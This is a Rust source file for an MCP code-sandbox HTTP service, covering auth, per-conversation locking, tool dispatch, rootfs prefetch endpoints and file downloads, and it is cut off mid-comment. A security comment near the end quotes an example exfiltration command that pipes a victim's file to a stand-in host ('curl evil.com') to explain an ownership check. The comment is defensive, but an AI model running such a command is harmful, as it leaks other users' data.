//! JSON-RPC dispatch + per-conversation concurrency gate for the
//! code_sandbox loopback HTTP surface.
//!
//! Auth (JWT validation + `code_sandbox::execute` permission check)
//! is handled by the standard `RequirePermissions<(CodeSandboxExecute,)>`
//! axum extractor — same JWT secret the MCP manager
//! (`client/manager.rs:96-107`) signs with, plus the permission grant
//! migration 35 adds to the default Users group.

use std::sync::Arc;

use axum::extract::Query;
use axum::http::StatusCode;
use axum::Json;
use dashmap::DashMap;
use once_cell::sync::Lazy;
use serde::Deserialize;
use serde_json::{json, Value};
use tokio::sync::Mutex;
use uuid::Uuid;

use crate::core::repository::Repos;
use crate::modules::code_sandbox::config;
use crate::modules::code_sandbox::permissions::CodeSandboxExecute;
use crate::modules::code_sandbox::types::{
    CodeSandboxState, ConversationIdHeader, JsonRpcError, JsonRpcRequest, JsonRpcResponse,
    SandboxContext,
};
use crate::modules::code_sandbox::{code_sandbox_server_id, streaming, tools};
use crate::modules::permissions::extractors::RequirePermissions;

/// Per-conversation mutex map. Two parallel tool calls in the same
/// conversation serialize; different conversations stay parallel.
/// Decorative `max_concurrent_sessions=1` on the server row gates only
/// the SAMPLING path (sandbox is supports_sampling=false), so we need
/// this gate ourselves.
///
/// The map grows monotonically as new conversation ids are seen.
/// Cleanup-on-conversation-delete is wired in a future change; in
/// practice each Arc<Mutex<()>> is tiny (~16 B).
static CONVERSATION_LOCKS: Lazy<DashMap<Uuid, Arc<Mutex<()>>>> = Lazy::new(DashMap::new);

pub(crate) fn conv_lock(conversation_id: Uuid) -> Arc<Mutex<()>> {
    CONVERSATION_LOCKS
        .entry(conversation_id)
        .or_insert_with(|| Arc::new(Mutex::new(())))
        .clone()
}

/// Drop a conversation's lock entry (L3 — bounds `CONVERSATION_LOCKS` growth).
/// Called by the workspace reaper when it reaps a stale conversation workspace,
/// so the map tracks only live conversations instead of leaking one entry per
/// conversation that ever ran a sandbox tool.
pub(crate) fn prune_conversation_lock(conversation_id: Uuid) {
    CONVERSATION_LOCKS.remove(&conversation_id);
}

// --------------------------------------------------------------------
// JSON-RPC entry point: POST /api/code-sandbox
// --------------------------------------------------------------------

pub async fn jsonrpc_handler(
    // Extractor order matters: auth runs first (rejects 401/403 before
    // body parse). Conversation-id parses next (always succeeds; may
    // be None for stateless methods like initialize/tools/list). Body
    // is last so a body-parse failure can never leak past auth.
    auth: RequirePermissions<(CodeSandboxExecute,)>,
    ConversationIdHeader(conversation_id): ConversationIdHeader,
    body: axum::body::Bytes,
) -> axum::response::Response {
    use axum::response::IntoResponse;

    // Parse the raw body ourselves (not via the `Json` extractor) so a
    // genuinely malformed payload returns JSON-RPC `-32700` Parse error +
    // HTTP 400 (per spec) rather than Axum's default plaintext 400.
    let raw: Value = match serde_json::from_slice(&body) {
        Ok(v) => v,
        Err(e) => {
            return error_response(None, StatusCode::BAD_REQUEST, JsonRpcError::parse_error(e.to_string()));
        }
    };

    // Streamable-HTTP: the client POSTs the result of a server-initiated
    // `elicitation/create` (download consent) back to this same endpoint
    // as `{jsonrpc, id, result}`. Classify + route it to the awaiting
    // execute stream BEFORE any conversation lock, so it can never
    // deadlock against the streaming task that holds that lock while
    // awaiting this very response. A JSON-RPC response carries no return
    // value → ack with a bodiless 202.
    if streaming::try_resolve_elicitation(&raw) {
        return StatusCode::ACCEPTED.into_response();
    }

    // Server-handled notifications that must run BEFORE the conv lock (no
    // `id`, so they expect no response). `notifications/cancelled` aborts an
    // in-flight streamed call (Phase 2); classify it here.
    if raw.get("method").and_then(|m| m.as_str()) == Some("notifications/cancelled") {
        streaming::handle_cancelled(&raw);
        return StatusCode::ACCEPTED.into_response();
    }

    let req: JsonRpcRequest = match serde_json::from_value(raw) {
        Ok(r) => r,
        Err(e) => {
            // Valid JSON, but not a valid JSON-RPC request object → -32600.
            return error_response(None, StatusCode::BAD_REQUEST, JsonRpcError::invalid_request(e.to_string()));
        }
    };

    // Any other notification (no `id`) expects no response → bodiless 202
    // (e.g. `notifications/initialized` the client sends after connect).
    if req.id.is_none() {
        return StatusCode::ACCEPTED.into_response();
    }

    let state = match config::get_state() {
        Some(s) => s,
        None => {
            return error_response(
                req.id,
                StatusCode::SERVICE_UNAVAILABLE,
                JsonRpcError::internal(
                    "code_sandbox not initialized (code_sandbox.enabled = false or boot probes failed)",
                ),
            );
        }
    };

    let user_id = auth.user.id;
    let id = req.id.clone();

    // Stateless methods: succeed WITHOUT a conversation context. The
    // MCP client probes these during server discovery before any
    // conversation is established (manager.rs:88-93 only injects the
    // header when a conversation_id exists).
    match req.method.as_str() {
        "initialize" => {
            return ok_response(
                id,
                json!({
                    "protocolVersion": "2025-11-25",
                    "capabilities": { "tools": {} },
                    "serverInfo": {
                        "name": "code_sandbox",
                        "version": env!("CARGO_PKG_VERSION"),
                    },
                }),
            );
        }
        "tools/list" => {
            return ok_response(id, json!({ "tools": tool_definitions() }));
        }
        "ping" => {
            // MCP/JSON-RPC ping → empty result. Both roles must answer ping.
            return ok_response(id, json!({}));
        }
        _ => {}
    }

    // Past this point we're dispatching a stateful method (today: only
    // `tools/call`), which requires the conversation context.
    let conversation_id = match conversation_id {
        Some(c) => c,
        None => {
            return error_response(
                id,
                StatusCode::OK,
                JsonRpcError::invalid_params(format!(
                    "method `{}` requires the x-conversation-id header",
                    req.method
                )),
            );
        }
    };

    // SECURITY: ownership check BEFORE any per-conversation lock insertion.
    // Otherwise an authenticated-but-not-the-owner caller (every user has
    // `code_sandbox::execute` per migration 35) could spam unique UUIDs in
    // x-conversation-id and grow the CONVERSATION_LOCKS DashMap unboundedly.
    if let Err(_e) = assert_owns_conversation(conversation_id, user_id).await {
        return error_response(
            id,
            StatusCode::NOT_FOUND,
            JsonRpcError::internal("CONVERSATION_NOT_FOUND".to_string()),
        );
    }

    // Build SandboxContext with the workspace + conversation files. Done
    // before the per-conversation lock (it's read-only DB work) so it can
    // be reused by both the streaming and single-shot branches.
    let ctx = match build_context(&state, conversation_id, user_id).await {
        Ok(c) => c,
        Err(_e) => {
            return error_response(
                id,
                StatusCode::INTERNAL_SERVER_ERROR,
                JsonRpcError::internal("BUILD_CONTEXT_FAILED".to_string()),
            );
        }
    };

    // `execute_command` is the one tool that can block on a large rootfs
    // download → it responds with an SSE stream (Streamable-HTTP) so it can
    // ask for download consent + stream progress. The per-conversation lock
    // is acquired INSIDE the streaming task (held for its whole duration).
    if req.method == "tools/call"
        && req.params.get("name").and_then(|v| v.as_str()) == Some("execute_command")
    {
        let args = req.params.get("arguments");
        let command = args
            .and_then(|a| a.get("command"))
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string();
        let flavor = args
            .and_then(|a| a.get("flavor"))
            .and_then(|v| v.as_str())
            .unwrap_or("minimal")
            .to_string();
        let progress_token = req
            .params
            .get("_meta")
            .and_then(|m| m.get("progressToken"))
            .cloned();
        return streaming::execute_command_stream(
            ctx,
            id.unwrap_or(Value::Null),
            command,
            flavor,
            progress_token,
        )
        .into_response();
    }

    // All other (fast, single-shot) tools/calls: serialize per conversation
    // and dispatch to a JSON response.
    let lock = conv_lock(conversation_id);
    let _guard = lock.lock().await;

    match dispatch(&ctx, &req).await {
        Ok(value) => ok_response(id, value),
        Err(err) => error_response(id, StatusCode::OK, err),
    }
}

/// Dispatch the stateful methods (the stateless ones — `initialize`,
/// `tools/list` — are handled in `jsonrpc_handler` before this is
/// reached, so they don't need a SandboxContext).
async fn dispatch(
    ctx: &SandboxContext,
    req: &JsonRpcRequest,
) -> Result<Value, JsonRpcError> {
    match req.method.as_str() {
        "tools/call" => {
            #[derive(Deserialize)]
            struct CallParams {
                name: String,
                #[serde(default)]
                arguments: Value,
            }
            let p: CallParams = serde_json::from_value(req.params.clone())
                .map_err(|e| JsonRpcError::invalid_params(format!("tools/call params: {e}")))?;

            let result = invoke_tool(ctx, &p.name, &p.arguments)
                .await
                .map_err(|app_err| {
                    // Log the full error server-side; return a
                    // generic envelope to the client to avoid
                    // leaking host paths, DB error strings, or
                    // internal field names via Debug formatting.
                    tracing::warn!(
                        tool = %p.name,
                        error = ?app_err,
                        "code_sandbox: tool invocation failed"
                    );
                    JsonRpcError::internal(format!("tool {} failed", p.name))
                })?;

            // MCP spec: `content[]` is an array of typed content blocks
            // ({type:"text"}, {type:"resource_link"}, {type:"image"}, ...).
            // Tools whose result IS already an MCP content block (i.e. has
            // a `type` field matching a known block type) must be passed
            // through verbatim — wrapping such a result in a text block
            // would silently break spec-conformant clients walking
            // `content[].type == "resource_link"`. Other tools' results
            // are structured JSON; serialize as a text block so the LLM
            // can parse them.
            let content = mcp_content_blocks(&result);

            Ok(json!({
                "content": content,
                "isError": false,
                "structuredContent": result,
            }))
        }
        other => Err(JsonRpcError::method_not_found(other)),
    }
}

fn ok_response(id: Option<Value>, result: Value) -> axum::response::Response {
    use axum::response::IntoResponse;
    (
        StatusCode::OK,
        Json(JsonRpcResponse {
            jsonrpc: "2.0",
            id,
            result: Some(result),
            error: None,
        }),
    )
        .into_response()
}

async fn invoke_tool(
    ctx: &SandboxContext,
    name: &str,
    args: &Value,
) -> Result<Value, crate::common::AppError> {
    match name {
        "execute_command" => {
            #[derive(Deserialize)]
            struct A {
                command: String,
                #[serde(default = "default_flavor")]
                flavor: String,
            }
            fn default_flavor() -> String {
                "minimal".to_string()
            }
            let a: A = serde_json::from_value(args.clone())
                .map_err(invalid_tool_args)?;
            tools::execute::execute_command(ctx, &a.command, &a.flavor).await
        }
        "read_file" => {
            #[derive(Deserialize)]
            struct A {
                filename: String,
                #[serde(default)]
                start_line: Option<usize>,
                #[serde(default)]
                end_line: Option<usize>,
            }
            let a: A = serde_json::from_value(args.clone())
                .map_err(invalid_tool_args)?;
            tools::files::read_file(ctx, &a.filename, a.start_line, a.end_line).await
        }
        "write_file" => {
            #[derive(Deserialize)]
            struct A {
                filename: String,
                content: String,
            }
            let a: A = serde_json::from_value(args.clone())
                .map_err(invalid_tool_args)?;
            tools::files::write_file(ctx, &a.filename, &a.content).await
        }
        "edit_file" => {
            #[derive(Deserialize)]
            struct A {
                filename: String,
                start_line: usize,
                end_line: usize,
                new_content: String,
            }
            let a: A = serde_json::from_value(args.clone())
                .map_err(invalid_tool_args)?;
            tools::files::edit_file(ctx, &a.filename, a.start_line, a.end_line, &a.new_content)
                .await
        }
        "list_files" => tools::files::list_files(ctx).await,
        "list_sandbox_environments" => list_sandbox_environments(ctx).await,
        "get_resource_link" => {
            #[derive(Deserialize)]
            struct A {
                filename: String,
                #[serde(default)]
                save_as: Option<String>,
            }
            let a: A = serde_json::from_value(args.clone())
                .map_err(invalid_tool_args)?;
            tools::files::get_resource_link(ctx, &a.filename, a.save_as.as_deref()).await
        }
        other => Err(crate::common::AppError::new(
            StatusCode::BAD_REQUEST,
            "UNKNOWN_TOOL",
            format!("unknown tool: {other}"),
        )),
    }
}

fn invalid_tool_args(e: serde_json::Error) -> crate::common::AppError {
    crate::common::AppError::new(
        StatusCode::BAD_REQUEST,
        "INVALID_TOOL_ARGS",
        format!("invalid tool arguments: {e}"),
    )
}

/// Handler for the `list_sandbox_environments` MCP tool. Wraps the
/// shared `build_environments_response` helper in a JSON-RPC Value
/// for tool dispatch.
async fn list_sandbox_environments(
    _ctx: &SandboxContext,
) -> Result<Value, crate::common::AppError> {
    Ok(serde_json::to_value(build_environments_response())
        .unwrap_or_else(|_| json!({ "available": [] })))
}

/// Shared by the MCP tool (LLM access) AND the REST admin endpoint.
/// Reports every flavor advertised by `KNOWN_FLAVORS` along with a
/// `cached` boolean indicating whether picking that flavor will
/// trigger an auto-fetch on first use.
pub(crate) fn build_environments_response() -> EnvironmentsResponse {
    use crate::modules::code_sandbox::types::KNOWN_FLAVORS;

    let state = config::get_state();
    let cache_dir = state
        .as_ref()
        .map(|s| {
            std::path::PathBuf::from(s.config.rootfs_path())
                .parent()
                .map(std::path::Path::to_path_buf)
                .unwrap_or_else(|| std::path::PathBuf::from("."))
        })
        .unwrap_or_else(|| std::path::PathBuf::from("."));

    let available: Vec<EnvironmentInfo> = KNOWN_FLAVORS
        .iter()
        .map(|m| {
            let cached_size_bytes = flavor_cached_size_bytes(&cache_dir, m.flavor);
            EnvironmentInfo {
                flavor: m.flavor.to_string(),
                description: m.description.to_string(),
                approximate_size_mb: m.approximate_size_mb,
                cached: cached_size_bytes.is_some(),
                cached_size_bytes,
                // Overlaid by the HTTP handler (which can await the mount
                // registry); defaults false for the sync MCP-tool path.
                mounted: false,
            }
        })
        .collect();
    EnvironmentsResponse { available }
}

/// Sum the on-disk size of every `*-{flavor}.squashfs` in the cache dir.
/// `None` when no such file exists (the flavor is not cached).
fn flavor_cached_size_bytes(cache_dir: &std::path::Path, flavor: &str) -> Option<u64> {
    let suffix = format!("-{flavor}.squashfs");
    let mut total: u64 = 0;
    let mut found = false;
    for entry in std::fs::read_dir(cache_dir).ok()?.flatten() {
        if entry
            .file_name()
            .to_str()
            .is_some_and(|n| n.ends_with(&suffix))
        {
            found = true;
            if let Ok(meta) = entry.metadata() {
                total += meta.len();
            }
        }
    }
    found.then_some(total)
}

// =====================================================================
// REST admin surface: list environments, list+start prefetch tasks,
// SSE progress stream. All four endpoints are typed via aide/schemars
// so they surface in the generated openapi.json + the frontend's
// typed TypeScript client.
// =====================================================================

use crate::modules::code_sandbox::permissions::{
    CodeSandboxEnvironmentsManage, CodeSandboxEnvironmentsRead,
};
use crate::modules::code_sandbox::prefetch::{
    self, PrefetchStatus, SSEPrefetchCompleteData, SSEPrefetchConnectedData, SSEPrefetchEvent,
    SSEPrefetchFailedData, SSEPrefetchProgressData,
};
use crate::modules::code_sandbox::runtime_fetch::FetchPhase;
use crate::modules::permissions::openapi::with_permission;

#[derive(Debug, serde::Serialize, schemars::JsonSchema)]
pub struct EnvironmentInfo {
    pub flavor: String,
    pub description: String,
    pub approximate_size_mb: u64,
    pub cached: bool,
    /// Actual on-disk size of the flavor's cached squashfs file(s). `None`
    /// when the flavor is not cached.
    pub cached_size_bytes: Option<u64>,
    /// Whether the flavor is currently mounted (a server-spawned squashfuse
    /// is live, i.e. it may be in use by an in-flight execute_command).
    pub mounted: bool,
}

#[derive(Debug, serde::Serialize, schemars::JsonSchema)]
pub struct EnvironmentsResponse {
    pub available: Vec<EnvironmentInfo>,
}

#[derive(Debug, Deserialize, schemars::JsonSchema)]
pub struct StartPrefetchBody {
    pub flavor: String,
}

#[derive(Debug, serde::Serialize, schemars::JsonSchema)]
pub struct StartPrefetchResponse {
    pub task_id: Uuid,
    pub flavor: String,
    pub expected_size_mb: u64,
    pub status: PrefetchStatus,
    /// Ready-to-use SSE URL for the frontend's EventSource (relative
    /// to the API root).
    pub events_url: String,
}

#[derive(Debug, serde::Serialize, schemars::JsonSchema)]
pub struct PrefetchTaskSummary {
    pub task_id: Uuid,
    pub flavor: String,
    pub status: PrefetchStatus,
    /// RFC 3339 UTC timestamp of task start.
    pub started_at: String,
    pub last_phase: Option<FetchPhase>,
    pub outcome: Option<SSEPrefetchCompleteData>,
    pub error: Option<String>,
}

#[derive(Debug, serde::Serialize, schemars::JsonSchema)]
pub struct ListPrefetchTasksResponse {
    pub tasks: Vec<PrefetchTaskSummary>,
}

// ─── GET /code-sandbox/environments ───
pub async fn list_environments_handler(
    _auth: RequirePermissions<(CodeSandboxEnvironmentsRead,)>,
) -> crate::common::ApiResult<Json<EnvironmentsResponse>> {
    Ok((StatusCode::OK, Json(environments_with_mounted().await)))
}

/// `build_environments_response()` plus the `mounted` overlay, which needs to
/// await the mount registry. Used by the list + evict HTTP handlers.
async fn environments_with_mounted() -> EnvironmentsResponse {
    let mut resp = build_environments_response();
    let mounted = crate::modules::code_sandbox::runtime_mount::mounted_set().await;
    for e in &mut resp.available {
        e.mounted = mounted.contains(&e.flavor);
    }
    resp
}

pub fn list_environments_docs(op: aide::transform::TransformOperation) -> aide::transform::TransformOperation {
    with_permission::<(CodeSandboxEnvironmentsRead,)>(op)
        .id("CodeSandbox.listEnvironments")
        .tag("Code Sandbox")
        .summary("List available sandbox environments")
        .description(
            "Returns every rootfs flavor this server binary knows about, with \
             description, approximate size, and whether the squashfs is currently \
             cached locally. A `cached: false` flavor will trigger an auto-fetch \
             on the first `execute_command` or `POST /prefetch` for that flavor."
        )
        .response::<200, Json<EnvironmentsResponse>>()
        .response_with::<401, (), _>(|res| res.description("Unauthorized"))
}

// ─── DELETE /code-sandbox/environments/{flavor} ───
pub async fn evict_environment_handler(
    _auth: RequirePermissions<(CodeSandboxEnvironmentsManage,)>,
    axum::extract::Path(flavor): axum::extract::Path<String>,
) -> crate::common::ApiResult<Json<EnvironmentsResponse>> {
    use crate::modules::code_sandbox::types::KNOWN_FLAVORS;

    // Unknown flavor → 404.
    if !KNOWN_FLAVORS.iter().any(|m| m.flavor == flavor) {
        return Err((
            StatusCode::NOT_FOUND,
            crate::common::AppError::new(
                StatusCode::NOT_FOUND,
                "UNKNOWN_FLAVOR",
                format!("unknown sandbox flavor {flavor:?}"),
            ),
        ));
    }

    // Cache dir = the configured rootfs_path's parent (same convention as
    // list_environments / start_prefetch; falls back to cwd when disabled).
    let cache_dir = config::get_state()
        .as_ref()
        .map(|s| {
            std::path::PathBuf::from(s.config.rootfs_path())
                .parent()
                .map(std::path::Path::to_path_buf)
                .unwrap_or_else(|| std::path::PathBuf::from("."))
        })
        .unwrap_or_else(|| std::path::PathBuf::from("."));

    // Unmount (if mounted) + delete the cached squashfs. Idempotent: a
    // not-cached flavor is a 200 no-op. The next execute_command re-fetches.
    let outcome =
        crate::modules::code_sandbox::backend::active().evict_flavor(&cache_dir, &flavor).await;
    tracing::info!(
        flavor,
        bytes_freed = outcome.bytes_freed,
        was_cached = outcome.was_cached,
        "code_sandbox: evict endpoint"
    );

    // Return the refreshed environments list so the UI updates in one call.
    Ok((StatusCode::OK, Json(environments_with_mounted().await)))
}

pub fn evict_environment_docs(op: aide::transform::TransformOperation) -> aide::transform::TransformOperation {
    with_permission::<(CodeSandboxEnvironmentsManage,)>(op)
        .id("CodeSandbox.evictEnvironment")
        .tag("Code Sandbox")
        .summary("Evict a flavor's cached rootfs")
        .description(
            "Unmounts the flavor's squashfuse (if mounted) and deletes its cached \
             squashfs, freeing disk. Idempotent — a not-cached flavor is a no-op. \
             The next `execute_command` for the flavor re-fetches automatically. \
             Returns the refreshed environments list (the flavor's `cached` flips \
             to false)."
        )
        .response::<200, Json<EnvironmentsResponse>>()
        .response_with::<401, (), _>(|res| res.description("Unauthorized"))
        .response_with::<404, (), _>(|res| res.description("Unknown flavor"))
}

// ─── GET /code-sandbox/prefetch ───
pub async fn list_prefetch_tasks_handler(
    _auth: RequirePermissions<(CodeSandboxEnvironmentsRead,)>,
) -> crate::common::ApiResult<Json<ListPrefetchTasksResponse>> {
    let tasks = prefetch::list_tasks();
    let mut summaries: Vec<PrefetchTaskSummary> = Vec::with_capacity(tasks.len());
    for t in tasks {
        let snap = t.state.lock().await;
        summaries.push(PrefetchTaskSummary {
            task_id: t.task_id,
            flavor: t.flavor.clone(),
            status: snap.status,
            started_at: chrono::DateTime::<chrono::Utc>::from(t.started_at).to_rfc3339(),
            last_phase: snap.progress.last().map(|p| p.phase),
            outcome: snap.outcome.as_ref().map(|o| SSEPrefetchCompleteData {
                bytes_downloaded: o.bytes_downloaded,
                duration_ms: o.duration_ms,
                cosign_verified: o.cosign_verified,
            }),
            error: snap.error.clone(),
        });
    }
    Ok((StatusCode::OK, Json(ListPrefetchTasksResponse { tasks: summaries })))
}

pub fn list_prefetch_tasks_docs(op: aide::transform::TransformOperation) -> aide::transform::TransformOperation {
    with_permission::<(CodeSandboxEnvironmentsRead,)>(op)
        .id("CodeSandbox.listPrefetchTasks")
        .tag("Code Sandbox")
        .summary("List known prefetch tasks")
        .description(
            "One entry per flavor; terminal-state entries persist until \
             replaced by the next POST for the same flavor."
        )
        .response::<200, Json<ListPrefetchTasksResponse>>()
        .response_with::<401, (), _>(|res| res.description("Unauthorized"))
}

// ─── POST /code-sandbox/prefetch ───
pub async fn start_prefetch_handler(
    _auth: RequirePermissions<(CodeSandboxEnvironmentsManage,)>,
    Json(body): Json<StartPrefetchBody>,
) -> crate::common::ApiResult<Json<StartPrefetchResponse>> {
    // Cache dir comes from the configured rootfs_path's parent
    // (same convention used by runtime_mount + the existing MCP
    // list_environments path).
    let cache_dir = config::get_state()
        .as_ref()
        .map(|s| {
            std::path::PathBuf::from(s.config.rootfs_path())
                .parent()
                .map(std::path::Path::to_path_buf)
                .unwrap_or_else(|| std::path::PathBuf::from("."))
        })
        .unwrap_or_else(|| std::path::PathBuf::from("."));

    // `start_or_join` returns AppError only on unknown-flavor (400);
    // wrap with the matching status for ApiResult's tuple shape.
    let task = prefetch::start_or_join(&cache_dir, &body.flavor)
        .await
        .map_err(|e| (StatusCode::BAD_REQUEST, e))?;
    let snap = task.state.lock().await;
    Ok((
        StatusCode::OK,
        Json(StartPrefetchResponse {
            task_id: task.task_id,
            flavor: task.flavor.clone(),
            expected_size_mb: task.expected_size_mb,
            status: snap.status,
            events_url: format!("/api/code-sandbox/prefetch/{}/events", task.flavor),
        }),
    ))
}

pub fn start_prefetch_docs(op: aide::transform::TransformOperation) -> aide::transform::TransformOperation {
    with_permission::<(CodeSandboxEnvironmentsManage,)>(op)
        .id("CodeSandbox.startPrefetch")
        .tag("Code Sandbox")
        .summary("Start (or join) a rootfs prefetch task")
        .description(
            "Idempotent: concurrent POSTs for the same flavor while a task is \
             Running return the same task_id. The returned `events_url` is suitable \
             for the frontend's EventSource. If the flavor is already cached, the \
             returned status is `already_cached` and the task completes immediately."
        )
        .response::<200, Json<StartPrefetchResponse>>()
        .response_with::<400, (), _>(|res| res.description("Unknown flavor"))
        .response_with::<401, (), _>(|res| res.description("Unauthorized"))
}

// ─── GET /code-sandbox/prefetch/{flavor}/events ───
pub async fn subscribe_prefetch_events_handler(
    _auth: RequirePermissions<(CodeSandboxEnvironmentsRead,)>,
    axum::extract::Path(flavor): axum::extract::Path<String>,
) -> crate::common::ApiResult<
    axum::response::Sse<
        impl futures_util::Stream<Item = Result<axum::response::sse::Event, axum::Error>>,
    >,
> {
    use axum::response::sse::{Event, KeepAlive, Sse};

    let task = prefetch::get_task(&flavor).ok_or_else(|| {
        (
            StatusCode::NOT_FOUND,
            crate::common::AppError::new(
                StatusCode::NOT_FOUND,
                "PREFETCH_TASK_NOT_FOUND",
                format!("no prefetch task for flavor {flavor:?} (POST /prefetch first)"),
            ),
        )
    })?;

    // Subscribe BEFORE snapshotting so we don't drop events that
    // arrive between the snapshot and the subscribe.
    let mut rx = task.events.subscribe();
    let (initial_status, replay): (PrefetchStatus, Vec<_>) = {
        let snap = task.state.lock().await;
        (snap.status, snap.progress.clone())
    };

    let task_clone = task.clone();
    let stream = async_stream::stream! {
        // 1. Connected — first thing every subscriber gets.
        yield Ok::<Event, axum::Error>(SSEPrefetchEvent::Connected(SSEPrefetchConnectedData {
            flavor: task_clone.flavor.clone(),
            task_id: task_clone.task_id,
            status: initial_status,
            expected_size_mb: task_clone.expected_size_mb,
        }).into());

        // 2. Replay buffered progress so late subscribers catch up.
        for p in replay {
            yield Ok(SSEPrefetchEvent::Progress(SSEPrefetchProgressData {
                phase: p.phase,
                message: p.message,
            }).into());
        }

        // 3. If already terminal, emit the final event + done.
        match initial_status {
            PrefetchStatus::Completed | PrefetchStatus::AlreadyCached => {
                let snap = task_clone.state.lock().await;
                if let Some(o) = snap.outcome.as_ref() {
                    yield Ok(SSEPrefetchEvent::Complete(SSEPrefetchCompleteData {
                        bytes_downloaded: o.bytes_downloaded,
                        duration_ms: o.duration_ms,
                        cosign_verified: o.cosign_verified,
                    }).into());
                }
                return;
            }
            PrefetchStatus::Failed => {
                let snap = task_clone.state.lock().await;
                if let Some(err) = snap.error.as_ref() {
                    yield Ok(SSEPrefetchEvent::Failed(SSEPrefetchFailedData {
                        error: err.clone(),
                    }).into());
                }
                return;
            }
            PrefetchStatus::Running => { /* fall through to live loop */ }
        }

        // 4. Stream live events until broadcast closes (task ended).
        loop {
            match rx.recv().await {
                Ok(ev) => {
                    let is_terminal = matches!(
                        ev,
                        SSEPrefetchEvent::Complete(_) | SSEPrefetchEvent::Failed(_)
                    );
                    yield Ok(ev.into());
                    if is_terminal { break; }
                }
                Err(tokio::sync::broadcast::error::RecvError::Closed) => break,
                Err(tokio::sync::broadcast::error::RecvError::Lagged(_)) => continue,
            }
        }
    };

    Ok((
        StatusCode::OK,
        Sse::new(stream).keep_alive(KeepAlive::default()),
    ))
}

pub fn subscribe_prefetch_events_docs(op: aide::transform::TransformOperation) -> aide::transform::TransformOperation {
    with_permission::<(CodeSandboxEnvironmentsRead,)>(op)
        .id("CodeSandbox.subscribePrefetchEvents")
        .tag("Code Sandbox")
        .summary("Subscribe to prefetch progress via SSE")
        .description(
            "Server-Sent Events stream of prefetch progress for the named flavor. \
             The first event is always `connected`; the stream then replays any \
             buffered `progress` events (so late subscribers catch up) and finally \
             streams live events until the task reaches terminal state \
             (`complete` or `failed`). Declaring the SSEPrefetchEvent enum as \
             the 200 response is what surfaces the discriminated union in the \
             generated TypeScript client."
        )
        .response::<200, Json<SSEPrefetchEvent>>()
        .response_with::<401, (), _>(|res| res.description("Unauthorized"))
        .response_with::<404, (), _>(|res| res.description("No task for this flavor"))
}

/// Build the MCP `content[]` array for a tool result.
///
/// If the tool already returned a typed MCP content block
/// (`{type:"resource_link", ...}`, `{type:"image", ...}`, etc.),
/// pass it through verbatim. Otherwise serialize the structured
/// result as JSON in a text block.
///
/// Why this matters: the MCP 2025-11-25 spec says `content[]` is an
/// array of typed blocks. Wrapping a resource_link inside a text
/// block would silently break clients that walk
/// `content[].type == "resource_link"` to find downloadable URIs.
pub(crate) fn mcp_content_blocks(result: &Value) -> Vec<Value> {
    const KNOWN_CONTENT_TYPES: &[&str] = &[
        "text",
        "image",
        "audio",
        "resource_link",
        "resource",
    ];
    if let Some(t) = result.get("type").and_then(|v| v.as_str())
        && KNOWN_CONTENT_TYPES.contains(&t) {
            return vec![result.clone()];
        }
    vec![json!({
        "type": "text",
        "text": serde_json::to_string(result).unwrap_or_default(),
    })]
}

// --------------------------------------------------------------------
// GET /api/code-sandbox/file/download — workspace artifact serving.
// --------------------------------------------------------------------

#[derive(Debug, Deserialize)]
pub struct DownloadQuery {
    pub filename: String,
}

pub async fn download_handler(
    auth: RequirePermissions<(CodeSandboxExecute,)>,
    ConversationIdHeader(conversation_id): ConversationIdHeader,
    Query(q): Query<DownloadQuery>,
) -> Result<axum::response::Response, crate::common::AppError> {
    use axum::body::Body;
    use axum::response::Response;

    let state = config::get_state().ok_or_else(|| {
        crate::common::AppError::new(
            StatusCode::SERVICE_UNAVAILABLE,
            "SANDBOX_NOT_INITIALIZED",
            "code_sandbox not initialized",
        )
    })?;

    // Download is per-conversation; require the header.
    let conversation_id = conversation_id.ok_or_else(|| {
        crate::common::AppError::new(
            StatusCode::BAD_REQUEST,
            "MISSING_CONVERSATION_ID",
            "x-conversation-id header required for file download",
        )
    })?;

    // SECURITY: same cross-tenant guard as `jsonrpc_handler`. Without
    // this, any user with `code_sandbox::execute` could fetch another
    // user's workspace artifacts by passing their conversation_id in
    // the header.
    let user_id = auth.user.id;
    assert_owns_conversation(conversation_id, user_id).await?;

    let workspace = workspace_for(&state, conversation_id);
    let path = crate::modules::code_sandbox::tools::files::canonicalize_in_workspace(
        &workspace, &q.filename,
    )?;

    let bytes = tokio::fs::read(&path).await.map_err(|e| {
        crate::common::AppError::new(
            StatusCode::NOT_FOUND,
            "FILE_NOT_FOUND",
            format!("read {}: {e}", path.display()),
        )
    })?;

    let content_type = mime_guess::from_path(&q.filename)
        .first_or_octet_stream()
        .essence_str()
        .to_string();

    Response::builder()
        .status(StatusCode::OK)
        .header("Content-Type", content_type)
        .header(
            "Content-Disposition",
            format!(
                "attachment; filename=\"{}\"",
                disposition_filename(&q.filename)
            ),
        )
        .body(Body::from(bytes))
        .map_err(|e| {
            crate::common::AppError::new(
                StatusCode::INTERNAL_SERVER_ERROR,
                "RESPONSE_BUILD_FAILED",
                format!("download response: {e}"),
            )
        })
}

fn basename(name: &str) -> String {
    name.rsplit('/').next().unwrap_or(name).to_string()
}

/// Sanitize a filename for use in the `Content-Disposition` header
/// value. RFC 6266 quoted-string disallows `"` and bare backslash;
/// non-ASCII would need RFC 5987 `filename*=` encoding which we don't
/// emit. Replace problematic characters with `_` so the header is
/// always a valid HTTP header value. The actual download bytes are
/// the file content; the filename here is just a hint.
fn disposition_filename(name: &str) -> String {
    let base = basename(name);
    base.chars()
        .map(|c| {
            if c == '"' || c == '\\' || c == '\r' || c == '\n' || !c.is_ascii() {
                '_'
            } else {
                c
            }
        })
        .collect()
}

// --------------------------------------------------------------------
// Helpers
// --------------------------------------------------------------------

fn error_response(
    id: Option<Value>,
    status: StatusCode,
    err: JsonRpcError,
) -> axum::response::Response {
    use axum::response::IntoResponse;
    (
        status,
        Json(JsonRpcResponse {
            jsonrpc: "2.0",
            id,
            result: None,
            error: Some(err),
        }),
    )
        .into_response()
}

async fn build_context(
    state: &CodeSandboxState,
    conversation_id: Uuid,
    user_id: Uuid,
) -> Result<SandboxContext, crate::common::AppError> {
    // SECURITY: verify the JWT-authenticated caller actually owns this
    // conversation. Without this check, any authenticated user with
    // `code_sandbox::execute` (granted to the default Users group by
    // migration 35 — i.e. every user) could spoof `x-conversation-id`
    // to another user's conversation, get their attachments staged via
    // `stage_attachments`, see them bind-mounted into a sandbox the
    // caller controls (`sandbox.rs::build_bwrap_argv` does NOT filter
    // by user_id), and exfiltrate via `execute_command("cat
    // victim.csv && curl evil.com ...")`. The downstream `user_id ==
    // ctx.user_id` filters in tools/files.rs cover `read_file` and
    // `get_resource_link` but NOT the bwrap bind path or
